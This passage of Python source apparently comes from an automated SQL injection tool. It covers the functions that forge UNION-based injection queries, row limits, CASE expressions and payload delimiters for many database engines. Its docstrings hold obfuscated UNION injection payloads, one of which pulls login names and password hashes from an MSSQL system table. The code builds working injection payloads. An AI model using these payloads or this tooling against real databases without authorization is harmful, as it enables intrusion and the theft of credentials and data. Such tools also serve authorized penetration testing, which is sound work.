        Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))
        Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738

        Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins
        Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254

        @param query: it is a processed query string unescaped to be
        forged within an UNION ALL SELECT statement
        @type query: C{str}

        @param position: it is the NULL position where it is possible
        to inject the query
        @type position: C{int}

        @return: UNION ALL SELECT query string forged
        @rtype: C{str}
        """

        if conf.uFrom:
            fromTable = " FROM %s" % conf.uFrom
        elif not fromTable:
            if kb.tableFrom:
                fromTable = " FROM %s" % kb.tableFrom
            else:
                fromTable = FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), "")

        if query.startswith("SELECT "):
            query = query[len("SELECT "):]

        unionQuery = self.prefixQuery("UNION ALL SELECT ", prefix=prefix)

        if limited:
            unionQuery += ','.join(char if _ != position else '(SELECT %s)' % query for _ in xrange(0, count))
            unionQuery += fromTable
            unionQuery = self.suffixQuery(unionQuery, comment, suffix)

            return unionQuery
        else:
            _ = zeroDepthSearch(query, " FROM ")
            if _:
                fromTable = query[_[0]:]

            if fromTable and query.endswith(fromTable):
                query = query[:-len(fromTable)]

        topNumRegex = re.search(r"\ATOP\s+([\d]+)\s+", query, re.I)
        if topNumRegex:
            topNum = topNumRegex.group(1)
            query = query[len("TOP %s " % topNum):]
            unionQuery += "TOP %s " % topNum

        intoRegExp = re.search(r"(\s+INTO (DUMP|OUT)FILE\s+'(.+?)')", query, re.I)

        if intoRegExp:
            intoRegExp = intoRegExp.group(1)
            query = query[:query.index(intoRegExp)]

            position = 0
            char = NULL

        for element in xrange(0, count):
            if element > 0:
                unionQuery += ','

            if element == position:
                unionQuery += query
            else:
                unionQuery += char

        if fromTable and not unionQuery.endswith(fromTable):
            unionQuery += fromTable

        if intoRegExp:
            unionQuery += intoRegExp

        if multipleUnions:
            unionQuery += " UNION ALL SELECT "

            for element in xrange(count):
                if element > 0:
                    unionQuery += ','

                if element == position:
                    unionQuery += multipleUnions
                else:
                    unionQuery += char

            if fromTable:
                unionQuery += fromTable

        unionQuery = self.suffixQuery(unionQuery, comment, suffix)

        return unionQuery

    def limitCondition(self, expression, dump=False):
        startLimit = 0
        stopLimit = None
        limitCond = True

        topLimit = re.search(r"TOP\s+([\d]+)\s+", expression, re.I)

        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)

        if hasattr(queries[Backend.getIdentifiedDbms()].limitregexp, "query2"):
            limitRegExp2 = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query2, expression, re.I)
        else:
            limitRegExp2 = None

        if (limitRegExp or limitRegExp2) or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE, DBMS.H2):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    if limitRegExp:
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))
                        stopLimit = limitRegExp.group(int(limitGroupStop))
                    elif limitRegExp2:
                        startLimit = 0
                        stopLimit = limitRegExp2.group(int(limitGroupStart))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1
                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.isDbms(DBMS.ORACLE):
                limitCond = False

        # We assume that only queries NOT containing a "LIMIT #, 1"
        # (or equivalent depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if (limitRegExp or limitRegExp2) and stopLimit is not None:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or equivalent, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE):
                    stopLimit += startLimit
                    if expression.find(queries[Backend.getIdentifiedDbms()].limitstring.query) > 0:
                        _ = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    else:
                        _ = re.search(r"\bLIMIT\b", expression, re.I).start()
                    expression = expression[:_]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit
            elif dump:
                if conf.limitStart:
                    startLimit = conf.limitStart - 1
                if conf.limitStop:
                    stopLimit = conf.limitStop

        return expression, limitCond, topLimit, startLimit, stopLimit

    def limitQuery(self, num, query, field=None, uniqueField=None):
        """
        Take in input a query string and return its limited query string.

        Example:

        Input:  SELECT user FROM mysql.users
        Output: SELECT user FROM mysql.users LIMIT <num>, 1

        @param num: limit number
        @type num: C{int}

        @param query: query to be processed
        @type query: C{str}

        @param field: field within the query
        @type field: C{list}

        @return: limited query string
        @rtype: C{str}
        """

        if " FROM " not in query:
            return query

        limitedQuery = query
        limitStr = queries[Backend.getIdentifiedDbms()].limit.query
        fromIndex = limitedQuery.index(" FROM ")
        untilFrom = limitedQuery[:fromIndex]
        fromFrom = limitedQuery[fromIndex + 1:]
        orderBy = None

        if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE, DBMS.H2):
            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num, 1)
            limitedQuery += " %s" % limitStr

        elif Backend.isDbms(DBMS.HSQLDB):
            match = re.search(r"ORDER BY [^ ]+", limitedQuery)
            if match:
                limitedQuery = re.sub(r"\s*%s\s*" % re.escape(match.group(0)), " ", limitedQuery).strip()
                limitedQuery += " %s" % match.group(0)

            if query.startswith("SELECT "):
                limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num, 1)
                limitedQuery = limitedQuery.replace("SELECT ", "SELECT %s " % limitStr, 1)
            else:
                limitStr = queries[Backend.getIdentifiedDbms()].limit.query2 % (1, num)
                limitedQuery += " %s" % limitStr

            if not match:
                match = re.search(r"%s\s+(\w+)" % re.escape(limitStr), limitedQuery)
                if match:
                    orderBy = " ORDER BY %s" % match.group(1)

        elif Backend.isDbms(DBMS.FIREBIRD):
            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num + 1, num + 1)
            limitedQuery += " %s" % limitStr

        elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
            if " ORDER BY " not in limitedQuery:
                limitStr = limitStr.replace(") WHERE LIMIT", " ORDER BY 1 ASC) WHERE LIMIT")
            elif " ORDER BY " in limitedQuery and "SELECT " in limitedQuery:
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            if query.startswith("SELECT "):
                delimiter = queries[Backend.getIdentifiedDbms()].delimiter.query
                limitedQuery = "%s FROM (%s,%s" % (untilFrom, untilFrom.replace(delimiter, ','), limitStr)
            else:
                limitedQuery = "%s FROM (SELECT %s,%s" % (untilFrom, ','.join(f for f in field), limitStr)

            limitedQuery = safeStringFormat(limitedQuery, (fromFrom,))
            limitedQuery += "=%d" % (num + 1)

        elif Backend.isDbms(DBMS.MSSQL):
            forgeNotIn = True

            if " ORDER BY " in limitedQuery:
                orderBy = limitedQuery[limitedQuery.index(" ORDER BY "):]
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            notDistincts = re.findall(r"DISTINCT[\(\s+](.+?)\)*\s+", limitedQuery, re.I)

            for notDistinct in notDistincts:
                limitedQuery = limitedQuery.replace("DISTINCT(%s)" % notDistinct, notDistinct)
                limitedQuery = limitedQuery.replace("DISTINCT %s" % notDistinct, notDistinct)

            if limitedQuery.startswith("SELECT TOP ") or limitedQuery.startswith("TOP "):
                topNums = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, limitedQuery, re.I)

                if topNums:
                    topNums = topNums.groups()
                    quantityTopNums = topNums[0]
                    limitedQuery = limitedQuery.replace("TOP %s" % quantityTopNums, "TOP 1", 1)
                    startTopNums = topNums[1]
                    limitedQuery = limitedQuery.replace(" (SELECT TOP %s" % startTopNums, " (SELECT TOP %d" % num)
                    forgeNotIn = False
                else:
                    limitedQuery = re.sub(r"\bTOP\s+\d+\s*", "", limitedQuery, flags=re.I)

            if forgeNotIn:
                limitedQuery = limitedQuery.replace("SELECT ", (limitStr % 1), 1)

                if " ORDER BY " not in fromFrom:
                    # Reference: https://web.archive.org/web/20150218053955/http://vorg.ca/626-the-MS-SQL-equivalent-to-MySQLs-limit-command
                    if " WHERE " in limitedQuery:
                        limitedQuery = "%s AND %s " % (limitedQuery, self.nullAndCastField(uniqueField or field))
                    else:
                        limitedQuery = "%s WHERE %s " % (limitedQuery, self.nullAndCastField(uniqueField or field))

                    limitedQuery += "NOT IN (%s" % (limitStr % num)
                    limitedQuery += "%s %s ORDER BY %s) ORDER BY %s" % (self.nullAndCastField(uniqueField or field), fromFrom, uniqueField or "1", uniqueField or "1")
                else:
                    match = re.search(r" ORDER BY (\w+)\Z", query)
                    field = match.group(1) if match else field

                    if " WHERE " in limitedQuery:
                        limitedQuery = "%s AND %s " % (limitedQuery, field)
                    else:
                        limitedQuery = "%s WHERE %s " % (limitedQuery, field)

                    limitedQuery += "NOT IN (%s" % (limitStr % num)
                    limitedQuery += "%s %s)" % (field, fromFrom)

        if orderBy:
            limitedQuery += orderBy

        return limitedQuery

    def forgeQueryOutputLength(self, expression):
        lengthQuery = queries[Backend.getIdentifiedDbms()].length.query
        select = re.search(r"\ASELECT\s+", expression, re.I)
        selectTopExpr = re.search(r"\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", expression, re.I)
        selectMinMaxExpr = re.search(r"\ASELECT\s+(MIN|MAX)\(.+?\)\s+FROM", expression, re.I)

        _, _, _, _, _, _, fieldsStr, _ = self.getFields(expression)

        if selectTopExpr or selectMinMaxExpr:
            lengthExpr = lengthQuery % ("(%s)" % expression)
        elif select:
            lengthExpr = expression.replace(fieldsStr, lengthQuery % fieldsStr, 1)
        else:
            lengthExpr = lengthQuery % expression

        return unescaper.escape(lengthExpr)

    def forgeCaseStatement(self, expression):
        """
        Take in input a query string and return its CASE statement query
        string.

        Example:

        Input:  (SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
        Output: SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y') THEN 1 ELSE 0 END)

        @param expression: expression to be processed
        @type num: C{str}

        @return: processed expression
        @rtype: C{str}
        """

        caseExpression = expression

        if Backend.getIdentifiedDbms() is not None:
            caseExpression = queries[Backend.getIdentifiedDbms()].case.query % expression

            if "(IIF" not in caseExpression and Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not caseExpression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):
                caseExpression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]

        return caseExpression

    def addPayloadDelimiters(self, value):
        """
        Adds payload delimiters around the input string
        """

        return "%s%s%s" % (PAYLOAD_DELIMITER, value, PAYLOAD_DELIMITER) if value else value

    def removePayloadDelimiters(self, value):
        """
        Removes payload delimiters from inside the input string
        """

        return value.replace(PAYLOAD_DELIMITER, '') if value else value

    def extractPayload(self, value):
        """
        Extracts payload from inside of the input string
        """

        _ = re.escape(PAYLOAD_DELIMITER)
        return extractRegexResult(r"(?s)%s(?P<result>.*?)%s" % (_, _), value)

    def replacePayload(self, value, payload):
        """
        Replaces payload inside the input string with a given payload
        """

        _ = re.escape(PAYLOAD_DELIMITER)
        return re.sub(r"(?s)(%s.*?%s)" % (_, _), ("%s%s%s" % (PAYLOAD_DELIMITER, getUnicode(payload), PAYLOAD_DELIMITER)).replace("\\", r"\\"), value) if value else value

    def runAsDBMSUser(self, query):
        if conf.dbmsCred and "Ad Hoc Distributed Queries" not in query:
            query = getSQLSnippet(DBMS.MSSQL, "run_statement_as_user", USER=conf.dbmsUsername, PASSWORD=conf.dbmsPassword, STATEMENT=query.replace("'", "''"))

        return query

    def whereQuery(self, query):
        if conf.dumpWhere and query:
            prefix, suffix = query.split(" ORDER BY ") if " ORDER BY " in query else (query, "")

            if conf.tbl and "%s)" % conf.tbl.upper() in prefix.upper():
                prefix = re.sub(r"(?i)%s\)" % re.escape(conf.tbl), "%s WHERE %s)" % (conf.tbl, conf.dumpWhere), prefix)
            elif re.search(r"(?i)\bWHERE\b", prefix):
                prefix += " AND %s" % conf.dumpWhere
            else:
                prefix += " WHERE %s" % conf.dumpWhere

            query = "%s ORDER BY %s" % (prefix, suffix) if suffix else prefix

        return query

# SQL agent
agent = Agent()
